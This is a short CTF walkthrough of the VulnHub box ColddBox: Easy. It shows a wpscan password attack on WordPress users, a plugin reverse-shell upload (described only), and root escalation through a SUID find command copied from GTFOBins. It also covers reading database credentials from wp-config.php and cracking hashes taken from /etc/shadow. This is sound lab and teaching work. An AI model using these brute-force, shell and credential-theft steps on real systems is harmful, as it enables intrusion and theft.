## Introduction
*Welcome to ColddBox Easy, it is a Wordpress machine with an easy level of difficulty, highly recommended for beginners in the field, good luck! Please share your feedback: "https://twitter.com/C0ldd__”*

This is [ColddBox: Easy](https://www.vulnhub.com/entry/colddbox-easy,586/) from vulnhub. Last one before bedtime - this will be brief.

## Ports
This box just has HTTP on port 80 and SSH on a non-standard port: 4512. We won't be needing it anyway.

## Website
The website is running Wordpress, and wpscan finds several users. I run a password attack:

``
root@kali:/opt/vulnhub/coldbox# wpscan --url http://192.168.1.128 -U 'hugo,c0ldd,philip' -P /usr/share/seclists/Passwords/probable-v2-top12000.txt
``

And find the password for *c0ldd*

>[!] Valid Combinations Found:  
 | Username: c0ldd, Password: 9876543210

I stop the scan at this point and login. *c0ldd* is the admin and we have an older version of Wordpress, so I upload a reverse shell as a plugin and get on the box.

## Privesc
We've got **find** with the SUID bit set, so that's our path to root.

[GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) says: 

``
./find . -exec /bin/sh -p \; -quit
``

{% highlight shell %}
www-data@ColddBox-Easy:/var/www/html$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# cd /root
cd /root
# ls 
ls 
root.txt
# cat root.txt
cat root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
{% endhighlight %}

That was that. 


## Other stuff
I also found the database creds:
>/var/www/html/wp-config.php:define('DB_PASSWORD', 'cybersecurity');  
/var/www/html/wp-config.php:define('DB_USER', 'c0ldd');

So I logged in and grabbed the hashes:

{% highlight shell %}
www-data@ColddBox-Easy:/var/www/html$ mysql --host=localhost -u c0ldd -p
mysql --host=localhost -u c0ldd -p
Enter password: cybersecurity

The hash for Hugo cracked easily but he's not a system user so I logged into Wordpress, but there was nothing interesting there. The other one didn't want to crack, so that was a dead end anyway. 

c0ldd didn't reuse his Wordpress password for his Linux account, so I couldn't *su* to him. I grabbed his hash from */etc/shadow* and it's running in Hashcat but hasn't broken yet ... I'm off to bed :)
